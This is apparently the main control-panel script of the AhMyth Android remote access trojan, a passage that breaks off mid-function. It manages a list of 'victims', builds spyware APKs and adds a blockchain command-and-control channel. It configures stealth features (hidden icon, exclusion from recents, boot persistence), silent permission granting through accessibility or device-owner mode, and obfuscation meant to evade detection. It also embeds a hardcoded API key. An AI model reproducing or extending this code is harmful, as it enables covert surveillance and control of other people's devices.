var app = angular.module('myapp', []);
const remote = require('@electron/remote');
const {
    ipcRenderer
} = require('electron');

// Production mode detection
const IS_PRODUCTION = process.env.NODE_ENV === 'production' || (remote && remote.app && remote.app.isPackaged);
const IS_DEVELOPMENT = !IS_PRODUCTION;

// Logging helpers - only log in development or for errors
const devLog = (...args) => {
    if (IS_DEVELOPMENT) {
        console.log(...args);
    }
};
const devWarn = (...args) => {
    if (IS_DEVELOPMENT) {
        console.warn(...args);
    }
};

// Handle remote module with error handling
let dialog, victimsList, shell;
try {
    dialog = remote ? remote.dialog : null;
    victimsList = remote ? remote.require('./main') : null;
    shell = remote ? remote.shell : require('electron').shell;
} catch (e) {
    console.error("Failed to load remote modules:", e);
    dialog = null;
    victimsList = null;
    shell = null;
}

var fs = require('fs-extra');
const path = require('path');
var homedir = require('node-homedir');
const {
    dirname
} = require('path');
var dir = require("path");
const os = require('os');
let ethers, crypto, bs58, Connection, Keypair, PublicKey;
try {
    const ethersLib = require('ethers');
    ethers = ethersLib.ethers || ethersLib;
    devLog('[Blockchain] ethers loaded:', !!ethers);
} catch (e) {
    console.error('[Blockchain] Failed to load ethers:', e.message);
}
try {
    crypto = require('crypto');
    console.log('[Blockchain] crypto loaded:', !!crypto);
} catch (e) {
    console.error('[Blockchain] Failed to load crypto:', e.message);
}
try {
    bs58 = require('bs58');
    devLog('[Blockchain] bs58 loaded:', !!bs58, 'has decode:', typeof bs58.decode, 'has encode:', typeof bs58.encode);
} catch (e) {
    console.error('[Blockchain] Failed to load bs58:', e.message);
}
try {
    const solanaWeb3 = require('@solana/web3.js');
    Connection = solanaWeb3.Connection;
    Keypair = solanaWeb3.Keypair;
    PublicKey = solanaWeb3.PublicKey;
    devLog('[Blockchain] @solana/web3.js loaded - Connection:', !!Connection, 'Keypair:', !!Keypair, 'PublicKey:', !!PublicKey);
} catch (e) {
    console.error('[Blockchain] Failed to load @solana/web3.js:', e.message);
}

// Ensure Java 11 is discoverable for child processes used during APK build
const DEFAULT_JAVA_HOME = process.platform === 'win32'
    ? 'C:\\Program Files\\Eclipse Adoptium\\jdk-11.0.29.7-hotspot'
    : null;
if (!process.env.JAVA_HOME && DEFAULT_JAVA_HOME && fs.existsSync(DEFAULT_JAVA_HOME)) {
    process.env.JAVA_HOME = DEFAULT_JAVA_HOME;
}
if (process.env.JAVA_HOME) {
    const javaBin = path.join(process.env.JAVA_HOME, 'bin');
    if (!process.env.PATH.toLowerCase().includes(javaBin.toLowerCase())) {
        process.env.PATH = `${javaBin};${process.env.PATH}`;
    }
}

// Fix Constants require path - use path resolution that works in Electron renderer
let CONSTANTS;
try {
    // Try relative path first (works when script is loaded as module)
    CONSTANTS = require('../Constants');
} catch (e) {
    try {
        // Fallback: resolve from app directory
        const remote = require('@electron/remote');
        if (remote && remote.app) {
            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(appPath);
        } else {
            // Last resort: try resolving from known structure
            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(constantsPath);
        }
    } catch (e2) {
        console.error('Failed to load Constants:', e2);
        // Create a minimal fallback to prevent complete failure
        CONSTANTS = {
            apkName: 'Ahmyth.apk',
            signedApkName: 'Ahmyth-aligned-debugSigned.apk',
            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
            defaultPort: 1234,
            dataDir: 'AhMyth',
            downloadPath: 'Downloads',
            outputApkPath: 'Output'
        };
    }
}
const {
    promisify
} = require('util');
const { exec: execCallback, spawn } = require('child_process');
const exec = promisify(execCallback);
var xml2js = require('xml2js');
var readdirp = require('readdirp');
//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);

// Ensure output directory exists
if (!fs.existsSync(outputPath)) {
    fs.mkdirpSync(outputPath);
}
//--------------------------------------------------------------

const builderSettingsPath = path.join(dataPath, 'builder-settings.json');

// Prefer a LAN IP so builds default to the host address if nothing is saved
const detectLocalIPv4 = () => {
    try {
        const interfaces = os.networkInterfaces();
        const candidates = [];
        Object.keys(interfaces || {}).forEach((name) => {
            (interfaces[name] || []).forEach((iface) => {
                if (!iface || iface.internal || iface.family !== 'IPv4') return;
                candidates.push(iface.address);
            });
        });
        const preferred = candidates.find((ip) => ip.startsWith('192.168.') || ip.startsWith('10.'));
        return preferred || candidates[0] || null;
    } catch (e) {
        console.warn('[Builder] Failed to detect local IPv4:', e.message);
        return null;
    }
};

const normalizeBuilderSettings = (settings) => {
    if (!settings || typeof settings !== 'object') return null;
    const normalized = { ...settings };
    if (normalized.srcIP !== undefined && normalized.srcIP !== null) {
        normalized.srcIP = String(normalized.srcIP).trim();
    }
    if (normalized.srcPort !== undefined && normalized.srcPort !== null) {
        const portNum = Number(normalized.srcPort);
        normalized.srcPort = Number.isFinite(portNum) ? portNum : null;
    } else {
        normalized.srcPort = null;
    }
    const textFields = [
        'connectionType',
        'blockchainRpcUrl',
        'blockchainContract',
        'blockchainC2AesKey',
        'blockchainClientPrivateKey',
        'blockchainChain'
    ];
    for (const key of textFields) {
        if (normalized[key] !== undefined && normalized[key] !== null) {
            normalized[key] = String(normalized[key]).trim();
        }
    }
    return normalized;
};

const attachTimestamp = (settings, fallbackTimestamp) => {
    if (!settings) return null;
    const normalized = normalizeBuilderSettings(settings);
    if (!normalized) return null;
    normalized.updatedAt = settings.updatedAt || settings.updated_at || fallbackTimestamp || '1970-01-01T00:00:00.000Z';
    return normalized;
};

const pickLatestSettings = (a, b) => {
    if (!a) return b;
    if (!b) return a;
    const parseTime = (value) => {
        const parsed = Date.parse(value || '');
        return Number.isFinite(parsed) ? parsed : -Infinity;
    };
    return parseTime(a.updatedAt) >= parseTime(b.updatedAt) ? a : b;
};

const readPersistedBuilderSettings = () => {
    let storageSettings = null;
    let fileSettings = null;
    try {
        if (typeof localStorage !== 'undefined') {
            const saved = localStorage.getItem('ahmyth_builder_settings');
            if (saved && saved !== 'undefined') {
                storageSettings = attachTimestamp(JSON.parse(saved));
            }
        }
    } catch (e) {
        console.warn('[Builder] Failed to read settings from localStorage:', e.message);
    }
    try {
        if (fs.existsSync(builderSettingsPath)) {
            const raw = fs.readFileSync(builderSettingsPath, 'utf8');
            if (raw) {
                fileSettings = attachTimestamp(JSON.parse(raw));
            }
        }
    } catch (e) {
        console.warn('[Builder] Failed to read settings file:', e.message);
    }
    const latest = pickLatestSettings(storageSettings, fileSettings);
    if (!latest) {
        return null;
    }
    const { updatedAt, ...rest } = latest;
    return rest;
};

const persistBuilderSettings = (settings) => {
    if (!settings) return;
    const normalized = normalizeBuilderSettings(settings);
    if (!normalized) return;
    const payload = { ...normalized, updatedAt: new Date().toISOString() };
    let persistedSuccessfully = false;
    try {
        if (typeof localStorage !== 'undefined') {
            localStorage.setItem('ahmyth_builder_settings', JSON.stringify(payload));
            persistedSuccessfully = true;
        }
    } catch (e) {
        console.warn('[Builder] Failed to save settings to localStorage:', e.message);
    }
    try {
        fs.ensureDirSync(path.dirname(builderSettingsPath));
        fs.writeFileSync(builderSettingsPath, JSON.stringify(payload, null, 2), 'utf8');
        persistedSuccessfully = true;
    } catch (e) {
        console.warn('[Builder] Failed to write settings file:', e.message);
    }
    return persistedSuccessfully ? normalized : null;
};

//--------------------------------------------------------------

const specialCountryIcons = {
    local: { type: 'icon', value: 'home', title: 'Local Network' },
    lan: { type: 'icon', value: 'linkify', title: 'LAN' },
    bc: { type: 'icon', value: 'linkify', title: 'Blockchain' },
    blockchain: { type: 'icon', value: 'linkify', title: 'Blockchain' }
};

// Country code to flag image (using flagcdn.com for reliable rendering on all OS)
const countryCodeToFlag = (countryCode) => {
    if (!countryCode) return { type: 'icon', value: 'globe', title: 'Unknown' };
    const cc = countryCode.toLowerCase();
    const special = specialCountryIcons[cc];
    if (special) return special;
    // Validate country code (must be 2 letters)
    if (!/^[a-z]{2}$/i.test(cc)) return { type: 'icon', value: 'globe', title: 'Unknown' };
    // Return flag image URL
    return { 
        type: 'flag', 
        value: `https://flagcdn.com/24x18/${cc}.png`,
        value2x: `https://flagcdn.com/48x36/${cc}.png`,
        title: cc.toUpperCase()
    };
};

const markBlockchainCountry = (victim) => {
    if (!victim) return;
    const connectionType = (victim.connectionType || '').toLowerCase();
    const conn = (victim.conn || '').toLowerCase();
    const ipLabel = (victim.ip || '').toLowerCase().trim();
    const isBlockchain = !!(
        victim.isBlockchain ||
        connectionType === 'blockchain' ||
        conn === 'blockchain' ||
        ipLabel === 'blockchain' ||
        ipLabel.startsWith('blockchain')
    );
    if (isBlockchain) {
        victim.country = 'blockchain';
    }
};

// Legacy emoji function (kept for compatibility)
const countryCodeToEmoji = (countryCode) => {
    if (!countryCode) return '🌐';
    const cc = countryCode.toUpperCase();
    if (cc === 'LOCAL') return '🏠';
    if (cc === 'LAN') return '🔗';
    if (!/^[A-Z]{2}$/.test(cc)) return '🌐';
    const chars = [...cc].map(c => String.fromCodePoint(0x1F1A5 + c.charCodeAt(0)));
    return chars.join('');
};

// App Controller for (index.html)
app.controller("AppCtrl", ($scope, $sce) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    }; //default values for binding apk
    window.connectionModes = { tcp: true, blockchain: true };
    $appCtrl.blockchainLogs = '';
    $appCtrl.autoScrollBlockchainLogs = true;

    // Dashboard/Settings properties
    $appCtrl.platform = process.platform === 'win32' ? 'Windows' : process.platform === 'darwin' ? 'macOS' : 'Linux';
    $appCtrl.outputPath = outputPath;
    $appCtrl.downloadsPath = downloadsPath;
    $appCtrl.builtPayloads = [];
    $appCtrl.defaultPort = CONSTANTS.defaultPort || 42474;
    $appCtrl.port = $appCtrl.defaultPort;
    $appCtrl.showNotifications = true;
    $appCtrl.playSoundOnVictim = false;
    $appCtrl.autoStartServer = false;
    
    // APK Builder properties
    const persistedBuilderSettings = readPersistedBuilderSettings() || {};
    const detectedLocalIP = detectLocalIPv4();
    
    // Group builder settings into an object to prevent scope shadowing issues in views
    $appCtrl.builder = {
        connectionType: persistedBuilderSettings.connectionType || 'tcp',
        srcIP: persistedBuilderSettings.srcIP || detectedLocalIP || '192.168.0.227',
        srcPort: persistedBuilderSettings.srcPort || CONSTANTS.defaultPort || 1234,
        blockchainRpcUrl: persistedBuilderSettings.blockchainRpcUrl || '',
        blockchainContract: persistedBuilderSettings.blockchainContract || '',
        blockchainC2AesKey: persistedBuilderSettings.blockchainC2AesKey || '',
        blockchainClientPrivateKey: persistedBuilderSettings.blockchainClientPrivateKey || '',
        blockchainChain: persistedBuilderSettings.blockchainChain || 'solana',
        // Fallbacks and other non-persisted builder UI state
        blockchainRpcFallbacks: '',
        blockchainBlockStep: 10,
        blockchainCandidates: 5,
        blockchainOperatorPrivateKey: '',
        blockchainOperatorBalance: '',
        blockchainOperatorAddress: '',
        blockchainClientBalance: '',
        blockchainClientAddress: '',
        blockchainChannelBalance: ''
    };
    
    // Legacy support (optional, can be removed if all views updated)
    // $appCtrl.builder.srcIP = ...
    
    // Load saved builder settings on initialization
    $appCtrl.loadBuilderSettings = () => {
        try {
            const settings = readPersistedBuilderSettings();
            if (settings) {
                if (settings.srcIP) $appCtrl.builder.srcIP = settings.srcIP;
                if (settings.srcPort) $appCtrl.builder.srcPort = settings.srcPort;
                if (settings.connectionType) $appCtrl.builder.connectionType = settings.connectionType;
                if (settings.blockchainRpcUrl) $appCtrl.builder.blockchainRpcUrl = settings.blockchainRpcUrl;
                if (settings.blockchainContract) $appCtrl.builder.blockchainContract = settings.blockchainContract;
                if (settings.blockchainC2AesKey) $appCtrl.builder.blockchainC2AesKey = settings.blockchainC2AesKey;
                if (settings.blockchainClientPrivateKey) $appCtrl.builder.blockchainClientPrivateKey = settings.blockchainClientPrivateKey;
                if (settings.blockchainChain) $appCtrl.builder.blockchainChain = settings.blockchainChain;
                
                persistBuilderSettings(settings);
                
                const loadedIp = settings.srcIP || $appCtrl.builder.srcIP;
                const loadedPort = settings.srcPort || $appCtrl.builder.srcPort;
                $appCtrl.Log(`[✓] Builder settings loaded (${loadedIp || 'n/a'}:${loadedPort || ''})`, CONSTANTS.logStatus.SUCCESS);
                if (!$appCtrl.$$phase) $appCtrl.$apply();
            } else {
                $appCtrl.Log(`[ℹ] Using defaults (${ $appCtrl.builder.srcIP}:${$appCtrl.builder.srcPort })`, CONSTANTS.logStatus.INFO);
            }
        } catch (e) {
            console.error('[Builder] Failed to load settings:', e);
        }
    };
    
    // Save builder settings
    $appCtrl.saveBuilderSettings = () => {
        try {
            // Force Angular to update bindings first to ensure we read the latest values from the GUI
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
            
            devLog('[Builder] Saving settings. Input IP:', $appCtrl.builder.srcIP);
            
            const settings = {
                srcIP: $appCtrl.builder.srcIP,
                srcPort: $appCtrl.builder.srcPort,
                connectionType: $appCtrl.builder.connectionType,
                blockchainRpcUrl: $appCtrl.builder.blockchainRpcUrl,
                blockchainContract: $appCtrl.builder.blockchainContract,
                blockchainC2AesKey: $appCtrl.builder.blockchainC2AesKey,
                blockchainClientPrivateKey: $appCtrl.builder.blockchainClientPrivateKey,
                blockchainChain: $appCtrl.builder.blockchainChain
            };
            const normalized = persistBuilderSettings(settings);
            if (normalized) {
                $appCtrl.builder.srcIP = normalized.srcIP;
                $appCtrl.builder.srcPort = normalized.srcPort;
                $appCtrl.Log(`[✓] Builder settings saved (${normalized.srcIP || 'n/a'}:${normalized.srcPort || ''})`, CONSTANTS.logStatus.SUCCESS);
            } else {
                $appCtrl.Log('[✗] Builder settings failed to persist', CONSTANTS.logStatus.FAIL);
            }
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to save settings: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    // Load settings on initialization
    $appCtrl.loadBuilderSettings();
    
    // Auto-save on setting change (debounced)
    let saveTimeout = null;
    $appCtrl.onBuilderSettingChange = () => {
        // Clear existing timeout
        if (saveTimeout) {
            clearTimeout(saveTimeout);
        }
        // Auto-save after 2 seconds of no changes
        saveTimeout = setTimeout(() => {
            $appCtrl.saveBuilderSettings();
        }, 2000);
    };
    
    // Wrapper function to always use current GUI values
    $appCtrl.BuildWithCurrentValues = () => {
        // Force Angular to update bindings first
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
        
        // Always read fresh values from $appCtrl to ensure we use what's in the GUI
        // Convert to string/number explicitly to avoid any type issues
        const currentIP = String($appCtrl.builder.srcIP || '').trim();
        const currentPort = $appCtrl.builder.srcPort !== null && $appCtrl.builder.srcPort !== undefined ? Number($appCtrl.builder.srcPort) : null;
        const currentConnectionType = $appCtrl.builder.connectionType || 'tcp';
        
        console.log('[APK Builder] ========================================');
        console.log('[APK Builder] BuildWithCurrentValues() - Reading from GUI:');
        console.log(`  $appCtrl.builder.srcIP: "${$appCtrl.builder.srcIP}" (raw value)`);
        console.log(`  $appCtrl.builder.srcPort: ${$appCtrl.builder.srcPort} (raw value)`);
        console.log(`  Processed IP: "${currentIP}"`);
        console.log(`  Processed Port: ${currentPort}`);
        console.log(`  Connection Type: ${currentConnectionType}`);
        console.log('[APK Builder] ========================================');
        
        // Validate we have values before proceeding
        if (!currentIP || currentIP.length === 0) {
            $appCtrl.Log('[✗] Error: Server IP is empty. Please enter an IP address.', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        if (currentPort === null || currentPort === undefined || isNaN(currentPort)) {
            $appCtrl.Log('[✗] Error: Port is invalid. Please enter a valid port number.', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        // Log what we're about to pass to Build
        $appCtrl.Log(`[ℹ] Building with IP: ${currentIP}, Port: ${currentPort}`, CONSTANTS.logStatus.INFO);
        
        // CRITICAL: Ensure we pass the exact values from GUI - no defaults, no fallbacks
        // These values will be used directly in the Build function
        devLog(`[APK Builder] Calling Build() with IP: "${currentIP}", Port: ${currentPort}`);
        
        // Call Build with current GUI values - these MUST be used, no defaults
        $appCtrl.Build(
            currentIP,  // This will be used as the 'ip' parameter in Build()
            currentPort,  // This will be used as the 'port' parameter in Build()
            currentConnectionType,
            $appCtrl.builder.blockchainRpcUrl,
            $appCtrl.blockchainContract,
            $appCtrl.builder.blockchainBlockStep,
            $appCtrl.builder.blockchainCandidates,
            $appCtrl.builder.blockchainC2AesKey,
            $appCtrl.builder.blockchainClientPrivateKey,
            $appCtrl.blockchainChain
        );
    };
    
    // Stealth configuration options
    $appCtrl.stealthOptions = {
        hideIcon: true,           // Hide app icon from launcher
        hideFromRecents: true,    // Exclude from recent apps
        startOnBoot: true,        // Auto-start on boot
        silentNotification: true, // Use minimal notification
        persistentService: true,  // Auto-restart if killed
        wakelock: true           // Keep CPU wake lock
    };

    // Silent permissions options
    $appCtrl.silentPermOptions = {
        generateAdbScript: true,   // Generate ADB script to grant permissions
        skipPrompts: false,        // Skip permission prompts (request silently)
        useAccessibility: false,   // Use accessibility service to auto-grant
        deviceOwner: false         // Enable device owner mode
    };

    // Obfuscation options
    $appCtrl.obfuscationOptions = {
        randomizePackage: true,    // Generate random package name
        randomizeAppName: true,    // Generate random app name
        injectJunk: true,          // Inject junk classes
        randomizeVersion: true,    // Random version code
        addMetadata: true,         // Add random metadata files
        modifySignature: true,     // Unique build signature
        customPackage: '',         // Custom package name (optional)
        customAppName: ''          // Custom app name (optional)
    };
    
    // Blockchain C2 configuration
    $appCtrl.blockchainC2Enabled = false;
    $appCtrl.blockchainListening = false;
    const DEFAULT_SOLANA_RPC = process.env.SOLANA_RPC_URL || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com';
    const DEFAULT_ALCHEMY_SOL = process.env.SOLANA_ALCHEMY_KEY || process.env.ALCHEMY_API_KEY || process.env.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
    $appCtrl.blockchainChain = 'solana'; // tcp | blockchain (evm/solana)
    $appCtrl.blockchainC2RpcUrl = DEFAULT_SOLANA_RPC;
    $appCtrl.blockchainC2Contract = '';
    $appCtrl.blockchainC2BlockStep = 10;
    $appCtrl.blockchainC2Candidates = 5;
    $appCtrl.builder.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
    $appCtrl.builder.blockchainOperatorPrivateKey = process.env.BLOCKCHAIN_PRIVATE_KEY || process.env.SOLANA_OPERATOR_PRIVATE_KEY || '';
    $appCtrl.builder.blockchainClientPrivateKey = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || process.env.SOLANA_CLIENT_PRIVATE_KEY || '';
    $appCtrl.builder.blockchainOperatorAddress = '';
    $appCtrl.builder.blockchainClientAddress = '';
    $appCtrl.builder.blockchainChannelBalance = '';
    $appCtrl.builder.blockchainOperatorBalance = '';
    $appCtrl.builder.blockchainClientBalance = '';
    $appCtrl.builder.blockchainRpcFallbacks = [
        DEFAULT_SOLANA_RPC,
        `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_SOL}`,
        'https://api.devnet.solana.com'
    ].filter(Boolean).join(', ');
    $appCtrl.builder.blockchainRpcUrl = $appCtrl.blockchainC2RpcUrl;
    $appCtrl.blockchainContract = $appCtrl.blockchainC2Contract;
    
    // Robust path resolution using Electron remote
    let projectRoot = '';
    try {
        const appPath = remote.app.getAppPath(); // .../AhMyth-Server/app
        projectRoot = path.resolve(appPath, '..', '..'); // .../AhMyth
    } catch (e) {
        // Fallback for dev/test environment
        projectRoot = path.resolve(__dirname, '..', '..', '..', '..', '..', '..');
    }

    const blockchainKeysEnvPath = path.join(projectRoot, '.blockchain-keys.env');
    const blockchainContractEnvPath = path.join(projectRoot, '.blockchain-contract.env');
    
    // Load blockchain C2 config on init
    try {
        const blockchainConfigPath = path.join(__dirname, '..', '..', 'config', 'blockchain_c2.json');
        if (fs.existsSync(blockchainConfigPath)) {
            const config = JSON.parse(fs.readFileSync(blockchainConfigPath, 'utf8'));
            $appCtrl.blockchainC2Enabled = config.enabled || false;
            $appCtrl.blockchainC2RpcUrl = config.rpc_url || '';
            $appCtrl.blockchainC2Contract = config.contract_address || '0x0000000000000000000000000000000000000000';
            $appCtrl.blockchainC2BlockStep = config.block_step || 10;
            $appCtrl.blockchainC2Candidates = config.candidates_per_cycle || 5;
            // AES key should come from environment variable, not config file
            $appCtrl.builder.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
            $appCtrl.blockchainContract = $appCtrl.blockchainC2Contract;
        }
    } catch (e) {
        console.error('Failed to load blockchain C2 config:', e);
    }
    
    // Save blockchain C2 configuration
    $appCtrl.saveBlockchainC2Config = () => {
        try {
            const blockchainConfigPath = path.join(__dirname, '..', '..', 'config', 'blockchain_c2.json');
            const config = {
                enabled: $appCtrl.blockchainC2Enabled,
                rpc_url: $appCtrl.blockchainC2RpcUrl,
                contract_address: $appCtrl.blockchainC2Contract,
                block_step: $appCtrl.blockchainC2BlockStep,
                candidates_per_cycle: $appCtrl.blockchainC2Candidates,
                aes_key_env: 'BLOCKCHAIN_C2_AES_KEY',
                fallback_config_path: 'config/c2_fallback.json'
            };
            fs.ensureDirSync(path.dirname(blockchainConfigPath));
            fs.writeFileSync(blockchainConfigPath, JSON.stringify(config, null, 2), 'utf8');
            $appCtrl.Log('[✓] Blockchain C2 configuration saved', CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to save blockchain C2 config: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    $appCtrl.blockchainLogs = '';
    $appCtrl.autoScrollBlockchainLogs = true;
    $appCtrl.appendBlockchainLog = (line) => {
        $appCtrl.blockchainLogs = ($appCtrl.blockchainLogs || '') + line + '\n';
        if ($appCtrl.autoScrollBlockchainLogs && typeof document !== 'undefined') {
            const el = document.getElementById('blockchainLogs');
            if (el) {
                el.scrollTop = el.scrollHeight;
            }
        }
        if ($scope && !$scope.$$phase) $scope.$applyAsync();
    };
    $appCtrl.clearBlockchainLogs = () => {
        $appCtrl.blockchainLogs = '';
    };
    $appCtrl.toggleBlockchainAutoScroll = () => {
        $appCtrl.autoScrollBlockchainLogs = !$appCtrl.autoScrollBlockchainLogs;
    };
    
    function parseEnvFile(filePath) {
        if (!fs.existsSync(filePath)) return {};
        return fs.readFileSync(filePath, 'utf8')
            .split(/\r?\n/)
            .reduce((acc, line) => {
                const match = line.trim().match(/^([^=#]+)=(.*)$/);
                if (match) {
                    acc[match[1].trim()] = match[2].trim();
                }
                return acc;
            }, {});
    }

    const detectChainFromKey = (key) => {
        if (!key) return null;
        const trimmed = key.trim();
        if (/^0x[0-9a-fA-F]{64}$/.test(trimmed)) return 'evm';
        try {
            if (!bs58 || typeof bs58.decode !== 'function') {
                console.warn('[detectChainFromKey] bs58.decode not available');
                return null;
            }
            const decoded = bs58.decode(trimmed);
            if (decoded.length === 64) return 'solana';
        } catch (e) {
            console.warn('[detectChainFromKey] bs58 decode error:', e.message);
        }
        return null;
    };
    
    const deriveSolanaAddress = (secret) => {
        try {
            if (!bs58 || typeof bs58.decode !== 'function') {
                console.error('[deriveSolanaAddress] bs58.decode not available');
                return null;
            }
            const trimmed = secret.trim();
            console.log('[deriveSolanaAddress] Input length:', trimmed.length);
            const bytes = bs58.decode(trimmed);
            console.log('[deriveSolanaAddress] Decoded bytes length:', bytes.length);
            if (bytes.length !== 64) {
                console.warn('[deriveSolanaAddress] Expected 64 bytes, got:', bytes.length);
                return null;
            }
            const pubKeyBytes = bytes.slice(32);
            const address = bs58.encode(pubKeyBytes);
            console.log('[deriveSolanaAddress] Derived address:', address);
            return address;
        } catch (e) {
            console.error('[deriveSolanaAddress] Error:', e.message);
            return null;
        }
    };
    
    function updateBlockchainAddresses() {
        if (!ethers || !bs58) {
            console.warn('[updateBlockchainAddresses] Missing ethers or bs58:', { ethers: !!ethers, bs58: !!bs58 });
            return; // Exit if critical dependencies are missing
        }
        const chain = detectChainFromKey($appCtrl.builder.blockchainOperatorPrivateKey) ||
            detectChainFromKey($appCtrl.builder.blockchainClientPrivateKey) ||
            $appCtrl.blockchainChain ||
            'solana';
        $appCtrl.blockchainChain = chain;
        $appCtrl.builder.blockchainOperatorAddress = '';
        $appCtrl.builder.blockchainClientAddress = '';
        
        console.log('[updateBlockchainAddresses] Chain:', chain, 'OpKey:', $appCtrl.builder.blockchainOperatorPrivateKey ? 'set' : 'empty', 'ClientKey:', $appCtrl.builder.blockchainClientPrivateKey ? 'set' : 'empty');
        
        if (chain === 'evm') {
            try {
                if ($appCtrl.builder.blockchainOperatorPrivateKey) {
                    $appCtrl.builder.blockchainOperatorAddress = new ethers.Wallet($appCtrl.builder.blockchainOperatorPrivateKey).address;
                    console.log('[updateBlockchainAddresses] EVM Operator address:', $appCtrl.builder.blockchainOperatorAddress);
                }
            } catch (e) {
                console.error('[updateBlockchainAddresses] EVM Operator key error:', e.message);
                $appCtrl.builder.blockchainOperatorAddress = '';
            }
            try {
                if ($appCtrl.builder.blockchainClientPrivateKey) {
                    $appCtrl.builder.blockchainClientAddress = new ethers.Wallet($appCtrl.builder.blockchainClientPrivateKey).address;
                    console.log('[updateBlockchainAddresses] EVM Client address:', $appCtrl.builder.blockchainClientAddress);
                }
            } catch (e) {
                console.error('[updateBlockchainAddresses] EVM Client key error:', e.message);
                $appCtrl.builder.blockchainClientAddress = '';
            }
        } else {
            // Solana
            if ($appCtrl.builder.blockchainOperatorPrivateKey) {
                const opAddr = deriveSolanaAddress($appCtrl.builder.blockchainOperatorPrivateKey);
                $appCtrl.builder.blockchainOperatorAddress = opAddr || '';
                console.log('[updateBlockchainAddresses] Solana Operator address:', opAddr || 'derivation failed');
            }
            if ($appCtrl.builder.blockchainClientPrivateKey) {
                const clientAddr = deriveSolanaAddress($appCtrl.builder.blockchainClientPrivateKey);
                $appCtrl.builder.blockchainClientAddress = clientAddr || '';
                console.log('[updateBlockchainAddresses] Solana Client address:', clientAddr || 'derivation failed');
            }
        }
        console.log('[updateBlockchainAddresses] Final addresses - Op:', $appCtrl.builder.blockchainOperatorAddress, 'Client:', $appCtrl.builder.blockchainClientAddress);
    }
    
    async function getUiRpcProvider(chainOverride) {
        if (!ethers || !Connection) {
            $appCtrl.Log('[✗] Cannot get RPC provider: Missing ethers or Solana Connection library', CONSTANTS.logStatus.FAIL);
            throw new Error('Missing blockchain RPC provider dependencies'); // Throw to propagate error
        }
        const chain = chainOverride || $appCtrl.blockchainChain || detectChainFromKey($appCtrl.builder.blockchainOperatorPrivateKey) || 'solana';
        if (chain === 'evm') {
            let lastEvmError; // Track last EVM error
            const primary = ($appCtrl.builder.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
            const extras = ($appCtrl.builder.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
            const defaults = [
                'https://ethereum-sepolia-rpc.publicnode.com',
                'https://rpc.sepolia.org',
                'https://ethereum-sepolia.blockpi.network/v1/rpc/public'
            ];
            const candidates = [...new Set([primary, ...extras, ...defaults])];
            if (process.env.INFURA_PROJECT_ID) {
                candidates.push(`https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`);
            }
            
            for (const rpcUrl of candidates) {
                try {
                    const provider = new ethers.JsonRpcProvider(rpcUrl, { name: 'sepolia', chainId: 11155111 }, { staticNetwork: true });
                    await provider.getBlockNumber();
                    $appCtrl.Log(`[ℹ] EVM RPC connected: ${rpcUrl}`, CONSTANTS.logStatus.INFO); // Added logging
                    return { provider, rpcUrl, chain: 'evm' };
                } catch (err) {
                    $appCtrl.Log(`[⚠] EVM RPC failed (${rpcUrl}): ${err.message}`, CONSTANTS.logStatus.WARNING); // Added logging
                    lastEvmError = err; // Store last error for full failure
                    continue;
                }
            }
            throw lastEvmError || new Error('All EVM RPC endpoints failed'); // Throw last error or generic
        }
        
        let lastSolanaError; // Track last Solana error
        const primary = ($appCtrl.builder.blockchainRpcUrl || process.env.SOLANA_RPC_URL || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com').trim();
        const extras = ($appCtrl.builder.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
        const defaults = [
            `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_SOL}`,
            'https://api.devnet.solana.com'
        ];
        const candidates = [...new Set([primary, ...extras, ...defaults])];
        for (const rpcUrl of candidates) {
            try {
                const provider = new Connection(rpcUrl, 'confirmed');
                await provider.getLatestBlockhash('confirmed');
                $appCtrl.Log(`[ℹ] Solana RPC connected: ${rpcUrl}`, CONSTANTS.logStatus.INFO); // Added logging
                return { provider, rpcUrl, chain: 'solana' };
            } catch (err) {
                $appCtrl.Log(`[⚠] Solana RPC failed (${rpcUrl}): ${err.message}`, CONSTANTS.logStatus.WARNING); // Added logging
                lastSolanaError = err; // Store last error for full failure
                continue;
            }
        }
        throw lastSolanaError || new Error('All Solana RPC endpoints failed');
    }
    
    $appCtrl.generateAesKey = () => {
        if (!crypto) {
            $appCtrl.Log('[✗] Cannot generate AES key: Missing crypto library', CONSTANTS.logStatus.FAIL);
            return;
        }
        $appCtrl.builder.blockchainC2AesKey = crypto.randomBytes(32).toString('hex');
